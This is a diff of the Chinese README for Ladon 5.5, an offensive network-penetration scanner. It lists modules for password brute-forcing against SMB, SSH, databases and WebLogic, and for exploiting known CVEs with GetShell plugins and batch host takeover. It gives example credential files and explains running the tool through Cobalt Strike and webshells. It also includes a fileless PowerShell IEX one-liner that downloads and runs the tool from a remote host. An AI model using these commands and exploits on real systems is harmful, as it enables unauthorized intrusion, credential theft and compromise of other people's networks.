@@ -1,9 +1,47 @@
-# Ladon 5.5
-Author K8gege <br>
-Update 20191109 <br>
+![](https://k8gege.github.io/k8img/Ladon/Dragon.jpg)
+
+[![Author](https://img.shields.io/badge/Author-k8gege-blueviolet)](https://github.com/k8gege) 
+[![Ladon](https://img.shields.io/badge/Ladon-5.5-yellowgreen)](https://github.com/k8gege/Ladon) 
+[![Bin](https://img.shields.io/badge/Ladon-Bin-ff69b4)](https://github.com/k8gege/Ladon/releases) 
+[![GitHub issues](https://img.shields.io/github/issues/k8gege/Ladon)](https://github.com/k8gege/Ladon/issues) 
+[![Github Stars](https://img.shields.io/github/stars/k8gege/Ladon)](https://github.com/k8gege/Ladon) 
+[![GitHub forks](https://img.shields.io/github/forks/k8gege/Ladon)](https://github.com/k8gege/Ladon)
+[![GitHub license](https://img.shields.io/github/license/k8gege/Ladon)](https://github.com/k8gege/Ladon)
+
+### Ladon 5.5
+<img src=https://k8gege.github.io/k8img/Ladon/Ladon.gif></img>
+### Cobalt Strike
+<img src=https://k8gege.github.io/k8img/Ladon/CS_Ladon.gif></img>
+### PowerLadon
+<img src=https://k8gege.github.io/k8img/Ladon/PowerLadon.gif></img>
+### PythonLadon
+<img src=https://k8gege.github.io/k8img/Ladon//py/PyLadon.PNG></img>
+### LinuxLadon
+<img src=https://k8gege.github.io/k8img/Ladon/lnx/Linux_OnlinePC.PNG></img>
 
 ### 使用说明
-https://github.com/k8gege/Ladon/wiki<br>
+
+ID | 主题 |  URL 
+-|-|-
+1 | Ladon文档主页 | https://github.com/k8gege/Ladon/wiki<br>
+2 | 基础用法详解 | https://github.com/k8gege/Ladon/wiki/Ladon-Usage<br>
+3 | Cobalt Strike | https://github.com/k8gege/Ladon/wiki/Ladon-&-Cobalt-Strike<br>
+4 | Exp生成器使用 | https://github.com/k8gege/Ladon/wiki/LadonExp-Usage
+5 | 高度自定义插件 | https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle
+6 | 外部模块参考 | https://github.com/k8gege/K8CScan/wiki
+7 | PowerLadon | https://github.com/k8gege/Ladon/wiki/Ladon-&-PowerShell
+8 | PythonLadon | https://github.com/k8gege/PyLadon
+9 | LinuxLadon | https://github.com/k8gege/LinuxLadon
+10 | 漏洞演示视频 | https://github.com/k8gege/K8CScan/tree/master/Video
+
+### 源码编译
+git clone https://github.com/k8gege/Ladon.git<br>
+使用VS2012或以上版本分别编译.net 3.5、4.0版本EXE<br>
+
+### 成品下载
+https://github.com/k8gege/Ladon/releases<br>
+Win7/2008或安装.net 2.x 3.x系统可以使用3.5的exe<br>
+Win8-win10或安装.net 4.x系统可以使用4.0的exe<br>
 
 ### 关于
 
@@ -33,6 +71,7 @@ Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含
 
 Ladon.exe可在安装有.net 2.0及以上版本Win系统中使用(Win7后系统自带.net)<br>
 如Cmd、PowerShell、远控Cmd、WebShell等，以及Cobalt Strike内存加载使用<br>
+Ladon.ps1完美兼容win7-win10 PowerShell，不看版本可远程加载实现无文件渗透<br>
 
 ### 奇葩条件
 
@@ -79,28 +118,32 @@ Ladon采用C#研发，程序体积很小500K左右，即便马不行也能上传
 例子: Ladon OnlinePC(扫当前机器所处C段，其它模块同理)<br>
 例子: Ladon 192.168.1.8/24 OnlinePC<br>
 
-1  OnlinePC 		存活主机扫描<br>
-2  OnlineIP 		仅存活主机IP<br>
-3  UrlScan 			URL域名扫描<br>
-4  SameWeb 			同服域名扫描<br>
-5  WebScan 			Web信息扫描<br>
-6  WebDir 			后台目录扫描<br>
-7  SubDomain 		子域名爆破<br>
-8  DomainIP 		域名解析IP	<br>
-9  HostIP 			主机名转IP<br>
+ID | 模块名称 |  功能说明  | 返回结果
+-|-|-|-
+1 | OnlinePC | 存活主机扫描 | 存活IP、Mac地址、机器名
+2 | OnlineIP | 仅存活主机IP | 存活IP
+3 | UrlScan  | URL域名扫描 | 同服URL（不验证IP、域名、Web标题）
+4 | SameWeb  | 同服域名扫描 | 同服URL（验证IP、域名、Web标题）
+5 | WebScan  | Web信息扫描 | 存活IP、主机名、Banner、Web标题
+6 | WebDir  | 后台目录扫描 | 地址、HTTP状态
+7 | SubDomain  | 子域名爆破 | 子域名 (可用DomainIP/HostIP解析)
+8 | DomainIP  | 域名解析IP | 域名、IP
+9 | HostIP  | 主机名转IP | IP、域名
+
 
 #### 0x002 指纹识别/服务识别<br>
 
 例子: Ladon OsScan<br>
 例子: Ladon 192.168.1.8/24 OsScan<br>
 
-1  OsScan 			操作系统版本探测<br>
-2  PortScan 		端口扫描含Banner<br>
-3  WebBanner 		内网Web信息扫描<br>
-4  WhatCMS 			75种Web指纹识别<br>
-5  CiscoScan 		思科设备扫描<br>
-6  EnumMssql 		枚举Mssql数据库主机<br>
-7  EnumShare 		枚举网络共享资源<br>
+ID | 模块名称 |  功能说明  | 返回结果
+-|-|-|-
+1 | OsScan  |  操作系统版本探测 | 存活IP、机器名、操作系统
+2 | PortScan  | 端口扫描含Banner | 主机名、开放端口、服务识别、Banner、Web标题
+3 | WhatCMS  |  75种Web指纹识别 | URL、CMS版本、登陆页面、中间件等
+4 | CiscoScan  | 思科设备扫描 | 存活IP、设备型号、主机名、Boot、硬件版本
+5 | EnumMssql  | 枚举Mssql数据库主机 | 数据库IP、机器名、SQL版本
+6 | EnumShare  | 枚举网络共享资源 | 域、存活IP、共享路径
 
 #### 0x003 口令检测/密码爆破<br>
 [自定义端口(IP:端口)、帐密检测(用户 密码)、主机帐密检测(IP 端口 数据库 用户 密码)]<br>
@@ -110,17 +153,19 @@ Ladon采用C#研发，程序体积很小500K左右，即便马不行也能上传
 例子: Ladon 192.168.1.8:22 SshScan (指定端口)<br>
 例子: Ladon test.rar RarScan<br>
 
-1  WmiScan 			Wmi密码爆破(Windowns)<br>
-2  IpcScan 			Ipc密码爆破(Windows)<br>
-3  SmbScan 			SMB密码爆破(Windows)<br>
-4  SshScan 			SSH密码爆破(Linux)<br>
-5  MssqlScan 		Mssql数据库密码爆破<br>
-6  OracleScan 		Oracle数据库密码爆破<br>
-7  MysqlScan 		Mysql数据库密码爆破<br>
-8  WeblogicScan 	Weblogic后台密码爆破<br>
-9  VncScan 			VNC远程桌面密码爆破<br>
-10 FtpScan 			Ftp服务器密码爆破<br>
-11 RarScan 			Rar压缩包密码爆破	<br>
+ID | 模块名称 |  功能说明  | 返回结果
+-|-|-|-
+1 | WmiScan  |  Wmi密码爆破(Windowns) | 检测状态以及正确密码日志
+2 | IpcScan  |  Ipc密码爆破(Windows) | 检测状态以及正确密码日志
+3 | SmbScan  |  SMB密码爆破(Windows) | 检测状态以及正确密码日志
+4 | SshScan  |  SSH密码爆破(Linux) | 检测状态以及正确密码日志
+5 | MssqlScan  | Mssql数据库密码爆破 | 检测状态以及正确密码日志
+6 | OracleScan  | Oracle数据库密码爆破 | 检测状态以及正确密码日志
+7 | MysqlScan  | Mysql数据库密码爆破 | 检测状态以及正确密码日志
+8 | WeblogicScan | Weblogic后台密码爆破 | 检测状态以及正确密码日志
+9 | VncScan  |  VNC远程桌面密码爆破 | 检测状态以及正确密码日志
+10 | FtpScan  |  Ftp服务器密码爆破 | 检测状态以及正确密码日志
+11 | RarScan  |  Rar压缩包密码爆破 | 检测状态以及正确密码日志
 
 #### 0x004 漏洞检测/漏洞利用
 
@@ -128,36 +173,157 @@ Ladon采用C#研发，程序体积很小500K左右，即便马不行也能上传
 例子: Ladon 192.168.1.8/24 MS17010<br>
 例子: Ladon http://192.168.1.8 WeblogicExp<br>
 
-1  MS17010 			SMB漏洞检测(CVE-2017-0143/CVE-2017-0144/CVE-2017-0145/CVE-2017-0146/CVE-2017-0148)<br>
-2  WeblogicPoc		Weblogic漏洞检测(CVE-2019-2725)<br>
-3  PhpStudyPoc 		PhpStudy后门检测(phpstudy 2016/phpstudy 2018)<br>
-4  ActivemqPoc 		ActiveMQ漏洞检测(CVE-2016-3088)	<br>
-5  TomcatPoc 		Tomcat漏洞检测(CVE-2017-12615)<br>
-6  WeblogicExp		Weblogic漏洞利用(CVE-2019-2725)<br>
-7  TomcatExp 		Tomcat漏洞利用(CVE-2017-12615)<br>
-8  Struts2Poc		Struts2漏洞检测(S2-005/S2-009/S2-013/S2-016/S2-019/S2-032/DevMode)<br>
+ID | 模块名称 |  功能说明  
+-|-|-
+1 | MS17010   | SMB漏洞检测(CVE-2017-0143/CVE-2017-0144/CVE-2017-0145/CVE-2017-0146/CVE-2017-0148)<br>
+2 | WeblogicPoc | Weblogic漏洞检测(CVE-2019-2725)<br>
+3 | PhpStudyPoc |  PhpStudy后门检测(phpstudy 2016/phpstudy 2018)<br>
+4 | ActivemqPoc |  ActiveMQ漏洞检测(CVE-2016-3088) <br>
+5 | TomcatPoc  | Tomcat漏洞检测(CVE-2017-12615)<br>
+6 | WeblogicExp | Weblogic漏洞利用(CVE-2019-2725)<br>
+7 | TomcatExp  | Tomcat漏洞利用(CVE-2017-12615)<br>
+8 | Struts2Poc | Struts2漏洞检测(S2-005/S2-009/S2-013/S2-016/S2-019/S2-032/DevMode)<br>
 
-#### 0x006 加密解密
+#### 0x005 加密解密
 例子: Ladon 字符串 EnHex<br>
 例子: Ladon EnHex (批量str.txt)<br>
 
-1  EnHex			批量Hex密码加密<br>
-2  DeHex 			批量Hex密码解密<br>
-3  EnBase64			批量Base64密码加密<br>
-4  DeBase64 		批量Base64密码解密<br>
+ID | 模块名称 |  功能说明  
+-|-|-
+1 | EnHex |  批量Hex密码加密<br>
+2 | DeHex  |  批量Hex密码解密<br>
+3 | EnBase64 |  批量Base64密码加密<br>
+4 | DeBase64  | 批量Base64密码解密<br>
 
 注：以上仅是该工具内置模块的初级用法，外置插件或更高级用法请查看使用文档<br>
-	中级用法INI文件配置调用任意程序、系统命令、各种语言现成EXP的批量利用<br>
-	高级用法Exp生成器一键生成Poc，使用各种语言编写插件扩展Ladon扫描能力。<br>
+ 中级用法INI文件配置调用任意程序、系统命令、各种语言现成EXP的批量利用<br>
+ 高级用法Exp生成器一键生成Poc，使用各种语言编写插件扩展Ladon扫描能力。<br>
 
-### 外置插件模块(9)
+### 外部插件模块(9)
 
-1  漏洞扫描 CVE 2019-0708 Windows Rdp 3389远程代码执行<br>
-2  漏洞利用 ThinkPHP 5.0.22 5.1.29 RCE GetShell Exploit<br>
-3  漏洞利用 CVE-2019-9621 Zimbra GetShell Exploit<br>
-4  漏洞利用 CVE-2019-0604 SharePoint GetShell Exploit<br>
-5  漏洞利用 CVE 2016-3088 ActiveMQ GetShell Exploit<br>
-6  漏洞利用 Apache Solr 8.2.0 Velocity RCE 0day Exploit<br>
-7  漏洞利用 PhpStudy后门 GetShell Exploit<br>
-8  INI调用外部程序命令 批量SSH上控<br>
-9  INI调用外部程序命令 批量Win上控<br>
+ID | 模块类型 |  功能说明  
+-|-|-
+1 | 漏洞扫描 | CVE 2019-0708 Windows Rdp 3389漏洞批量检测<br>
+2 | 漏洞利用 | ThinkPHP 5.0.22 5.1.29 RCE GetShell Exploit<br>
+3 | 漏洞利用 | CVE-2019-9621 Zimbra GetShell Exploit<br>
+4 | 漏洞利用 |CVE-2019-0604 SharePoint GetShell Exploit<br>
+5 | 漏洞利用 |CVE 2016-3088 ActiveMQ GetShell Exploit<br>
+6 | 漏洞利用 | Apache Solr 8.2.0 Velocity RCE 0day Exploit<br>
+7 | 漏洞利用 | PhpStudy后门 GetShell Exploit<br>
+8 | 命令执行 | INI调用外部程序命令批量Linux上控<br>
+9 | 命令执行 | INI调用外部程序命令批量Windowns上控<br>
+
+文档参考Cscan: https://github.com/k8gege/K8CScan/wiki
+
+## 中级用法
+
+### 禁ping扫描
+默认扫描会先通过icmp扫描主机是否存活，当使用工具转发内网<br>
+或者目标机器禁ping时,使用noping参数进行扫描,速度稍慢一点<br>
+Ladon noping<br>
+Ladon noping 192.168.1.8/24<br>
+Ladon noping 192.168.1.8/24 MS17010<br>
+
+### 配置INI调用任意程序或命令脚本
+1  调用系统ping命令进行存活主机探测
+ping.ini<br>
+[Ladon]<br>
+exe=cmd.exe<br>
+arg=/c ping $ip$<br>
+
+命令:  Ladon ping.ini<br>
+命令:  Ladon 192.168.1.8/24 ping.ini<br>
+
+2  调用Python poc批量检测漏洞
+[Ladon]<br>
+exe=F:\Python279\python.exe<br>
+arg=CVE-2019-11043-POC.py $ip$<br>
+
+例子: https://github.com/k8gege/CVE-2019-11043
+
+### 配置端口扫描参数
+使用PortScan模块时，默认扫描常见高危漏洞端口<br>
+遇到修改了默认端口的，Ladon就无法扫描了吗？<br>
+使用port.txt<br>
+格式1:80,21,1433,3306,445<br>
+格式2:80-88,21-23,5800-5900<br>
+格式3:<br>
+21<br>
+23<br>
+80<br>
+格式4:<br>
+80-88<br>
+21-23<br>
+
+### 配置密码爆破参数
+1  支持标准的user.txt和pass.txt帐密破解，爆破每个用户都需将密码跑完或跑出正确为此<br>
+2  支持userpass.txt（存放用户名和对应密码）,用于快速验证其它机器是否存在相同帐密<br>
+3  支持check.txt（存放IP/端口/库名/用户/密码）,不指定端口和数据库名则使用默认<br>
+
+#### 数据库口令检测
+数据库与其它密码爆破不同，有时数据库做了权限，指定用户只能连指定库，连默认库肯定不行<br>
+##### mssql密码验证(大型内网可能从其它机器收集到大量机器密码，第一步肯定是先验证)<br>
+非默认端口请将以下端口改成被修改端口即可，单个IP可直接Ladon IP:端口 MssqlScan扫描<br>
+check.txt<br>
+192.168.1.8 1433 master sa k8gege<br>
+192.168.1.8 sa k8gege<br>
+192.168.1.8 1433 sa k8gege<br>
+命令: Ladon MssqlScan<br>
+##### oracle同理<br>
+192.168.1.8 1521 orcl system k8gege<br>
+192.168.1.8 orcl system k8gege<br>
+192.168.1.8 system k8gege<br>
+命令: Ladon OracleScan<br>
+##### mysql无需指定数据库名<br>
+192.168.1.8 3306 root k8gege<br>
+192.168.1.8 root k8gege<br>
+命令: Ladon MysqlScan<br>
+
+##### 系统密码
+SSH<br>
+check.txt<br>
+192.168.1.8 22 root k8gege<br>
+192.168.1.8 root k8gege<br>
+命令: Ladon SshScan<br>
+SMB/IPC/WMI(直接ip/用户/密码)<br>
+check.txt
+192.168.1.8 root k8gege<br>
+命令: Ladon WmiScan<br>
+##### 网站密码
+weblogic<br>
+check.txt(url 用户 密码)<br>
+http://192.168.1.8:7001/console weblogic k8gege<br>
+命令: Ladon WeblogicScan<br>
+
+##### 文件密码
+因Rar压缩包只需一个密码,故只需pass.txt,注意中文密码需将txt保存为Ansi编码<br>
+命令: Ladon test.rar RarScan<br>
+
+## PowerShell
+PowerLadon完美兼容win7-win10 PowerShell，对于不支持.net程序插件化的远控，可使用<br>
+PowerShell版,也可CMD命令行下远程加载内存实现无文件扫描，模块加载后用法和EXE一致。<br>
+
+#### 0x001 PowerShell本地加载<br>
+适用于支持PowerShell交互远控或Shell，如Cobalt Strike
+```bash
+> powershell 
+> Import-Module .\Ladon.ps1
+> Ladon OnlinePC
+```
+<img src=https://k8gege.github.io/k8img/Ladon/PowerLadon.gif></img>
+
+#### 0x002 Cmd本地加载
+适用于还没跟上时代的远控或Shell只支持CMD交互
+```bash
+> powershell Import-Module .\Ladon.ps1;Ladon OnlinePC
+```
+<img src=https://k8gege.github.io/k8img/Ladon/ps/CmdPSLadon.gif></img>
+
+#### 0x003 Cmd远程加载
+适用于还没跟上时代的远控或Shell只支持CMD交互
+```bash
+> powershell "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5:800/Ladon.ps1'); Ladon OnlinePC"
+```
+<img src=https://k8gege.github.io/k8img/Ladon/ps/CmdPSRemoteLadon.gif></img>
+
+End
